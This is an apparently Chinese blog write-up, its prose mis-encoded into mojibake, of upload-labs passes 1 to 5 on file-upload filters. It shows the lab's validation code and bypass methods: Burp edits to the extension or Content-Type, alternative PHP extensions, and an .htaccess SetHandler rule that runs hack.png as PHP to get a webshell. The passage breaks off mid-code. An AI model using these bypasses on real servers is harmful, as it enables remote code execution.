    <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2020/05/02/JvJadS.png" alt="JvJadS.png"></p><p><img src="https://s1.ax1x.com/2020/05/02/JvJYsP.png" alt="JvJYsP.png"></p><p>+++</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><img src="https://s1.ax1x.com/2020/05/02/JvJJMt.png" alt="JvJJMt.png"></p><p>å¦‚å›¾ï¼Œè¦æ±‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ï¼Œå¹¶è¦æ±‚æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡ï¼›</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬ä¸Šä¼ ä»»æ„æ–‡ä»¶è¯•è¯•ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJ8xI.png" alt="JvJ8xI.png"></p><p>æç¤ºæˆ‘ä»¬ï¼Œ<strong>åªèƒ½ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶</strong>ï¼›</p><p>æŸ¥çœ‹æç¤ºï¼Œâ€œæœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼â€ï¼›</p><p>æç¤ºå·²ç»å¾ˆæ˜ç¡®äº†ï¼Œè¯¥é¢˜ç›®åœ¨å®¢æˆ·ç«¯ä½¿ç”¨jsè¿‡æ»¤ä¸åˆæ³•åç¼€ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šä¼ æ—¶å°†æ–‡ä»¶æ”¹ä¸ºåˆæ³•åç¼€æ ¼å¼ï¼Œç„¶åæŠ“åŒ…ï¼Œå†æ”¹åŒ…ï¼›</p><p>çœ‹çœ‹æºç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ‹¦æˆªæ–¹å¼ï¼š<strong>å®¢æˆ·ç«¯jsç™½åå•æ£€æŸ¥</strong>;æ ¹æ®ä¸Šä¼ æ–‡ä»¶çš„åç¼€æ˜¯å¦ä¸º.jpg|.png|.gifæ ¼å¼æ¥åˆ¤æ–­æ–‡ä»¶èƒ½å¦ä¸Šä¼ ï¼›</li><li>ç»•è¿‡æ–¹å¼ï¼šå°†æœ¨é©¬ä¼ªè£…æˆ.jpg|.png|.gifæ–‡ä»¶ï¼Œä¸Šä¼ åburpæ‹¦æˆªæ•°æ®åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åç¼€ä¸º.phpï¼Œå†forward.</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvJdIg.png" alt="JvJdIg.png"></p><p>æ”¹åŒ…ï¼š</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJtqf.png" alt="JvJtqf.png"></p><p><strong>å…¶ä»–æ–¹æ³•:</strong></p><ol><li><p>ä¿®æ”¹jsè„šæœ¬</p></li><li><p>æµè§ˆå™¨ç¦æ­¢ä½¿ç”¨jsè„šæœ¬ï¼ˆç«ç‹ä¸‹ğŸ¦Š)</p><ul><li>åœ¨Firefoxåœ°å€æ é‡Œè¾“å…¥â€œabout:configâ€ã€‚åœ¨æœç´¢æ è¾“å…¥â€œjavascript.enabledâ€æŸ¥æ‰¾åˆ°é¦–é€‰é¡¹ã€‚ç‚¹å‡»é¼ æ ‡å³é”®é€‰æ‹©â€œåˆ‡æ¢â€ï¼ŒæŠŠâ€œjavascript.enabledâ€é”®å€¼æ”¹ä¸ºâ€œfalseâ€</li></ul></li></ol><p>+++</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼</strong>è¿™æ¬¡ç»™çš„ä¸æ˜¯ç™½åå•æˆ–è€…é»‘åå•ï¼Œè€Œæ˜¯å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œåº”è¯¥ä¸ºMIMEçš„æ£€æŸ¥ã€‚</p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼</p></blockquote><p><strong>è¡¥å……ï¼š</strong><br>MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼š</span><br><span class="line">è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html</span><br><span class="line">xmlæ–‡æ¡£ .xml text/xml</span><br><span class="line">XHTMLæ–‡æ¡£ .xhtml application/xhtml+xml</span><br><span class="line">æ™®é€šæ–‡æœ¬ .txt text/plain</span><br><span class="line">RTFæ–‡æœ¬ .rtf application/rtf</span><br><span class="line">PDFæ–‡æ¡£ .pdf application/pdf</span><br><span class="line">Microsoft Wordæ–‡ä»¶ .word application/msword</span><br><span class="line">PNGå›¾åƒ .png image/png</span><br><span class="line">GIFå›¾å½¢ .gif image/gif</span><br><span class="line">JPEGå›¾å½¢ .jpeg,.jpg image/jpeg</span><br><span class="line">auå£°éŸ³æ–‡ä»¶ .au audio/basic</span><br><span class="line">MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi</span><br><span class="line">RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio</span><br><span class="line">MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg</span><br><span class="line">AVIæ–‡ä»¶ .avi video/x-msvideo</span><br><span class="line">GZIPæ–‡ä»¶ .gz application/x-gzip</span><br><span class="line">TARæ–‡ä»¶ .tar application/x-tar</span><br><span class="line">ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream</span><br></pre></td></tr></table></figure><p>+++</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯ç™½åå•</strong>;å¯¹æ–‡ä»¶çš„MIME(Multipurpose Internet Mail Extensions)è¿›è¡Œäº†éªŒè¯ï¼Œåªå…è®¸å›¾ç‰‡ç±»æ–‡ä»¶ä¸Šä¼ é€šè¿‡</p></li><li><p>ç»•è¿‡æ–¹å¼ï¼š</p><ol><li><p>ç›´æ¥ä¸Šä¼ å«æœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶ï¼ŒburpæˆªåŒ…ï¼Œä¿®æ”¹åç¼€ä¸ºphpæ–‡ä»¶</p></li><li><p>ç›´æ¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼ŒburpæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typeä¸ºimage/pngç­‰å…è®¸ç±»å‹</p></li></ol></li></ul><p>+++</p><p>  æ­¤å¤„æˆ‘ä»¬åˆ©ç”¨2ä¿®æ”¹Content-Typeä¸ºimage/pngï¼š<br>æŠ“åŒ…ï¼š<br>[4]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJUZ8.png" alt="JvJUZ8.png"></p><p>æ”¹åŒ…ï¼š<br>[5]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvRDfA.png" alt="JvRDfA.png"></p><p>å‘åŒ…ï¼š<br>æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥å°†æ–‡ä»¶æ‹–å‡ºæ¥å³å¯å¾—è®¿é—®ï¼›</p><p><img src="https://s1.ax1x.com/2020/05/02/JvWp11.png" alt="JvWp11.png"></p><p>+++</p><h2 id="Psaa-03"><a href="#Psaa-03" class="headerlink" title="Psaa-03"></a>Psaa-03</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼</strong></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•éªŒè¯</strong>;(ç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶)</p></li><li><p>ç»•è¿‡æ–¹å¼ï¼š<br>(1)å¯ä¸Šä¼ .php3.phtml .phps .php5 .phtâ€¦ç­‰è¿™æ ·å¯ä»¥è¢«æœåŠ¡å™¨è§£æçš„åç¼€å<br>(2)é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ªhack.pngæ–‡ä»¶(å«æœ¨é©¬)<br>é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€hack.pngâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œæ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ<br>.htaccessæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "hack.png"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>application/x-httpd-phpç§°MIMEç±»å‹</p></blockquote><p>æ­¤å¤„ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º.php3;</p><p><img src="https://s1.ax1x.com/2020/05/02/JvR66P.png" alt="JvR66P.png"></p><p>ä¸Šä¼ æˆåŠŸï¼<br>+++</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š<strong>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !</strong> </p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼</p></blockquote><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><ul><li><p>æ‹¦æˆªæ–¹å¼ï¼š<strong>æœåŠ¡ç«¯é»‘åå•åŠ å¼ºéªŒè¯</strong>;ä¸Pass-03ç±»ä¼¼ï¼Œåªæ˜¯å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åçš„é™åˆ¶ç§ç±»å¢åŠ </p></li><li><p>ç»•è¿‡æ–¹å¼ï¼šé‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡(ç¬¬3å…³(2))</p><ol><li>ä¸Šä¼ <code>.htaccessæ–‡ä»¶</code></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "hack.png"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>ä¸Šä¼ hack.pngï¼ˆå«æœ¨é©¬ï¼‰</li></ol></li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvRBYd.png" alt="JvRBYd.png"></p><p>ä¸Šä¼ æˆåŠŸï¼Œå¹¶ä»¥phpè¿›è¡Œäº†è§£æï¼</p><p>+++</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*<em>æç¤ºï¼šæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼            *</em></p><p>æŸ¥çœ‹æç¤ºï¼š</p><blockquote><p>æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼</p></blockquote><p>Pass-05å‘é»‘åå•ä¸­å¢åŠ äº†<code>.htaccess</code>åç¼€æ–‡ä»¶;</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span 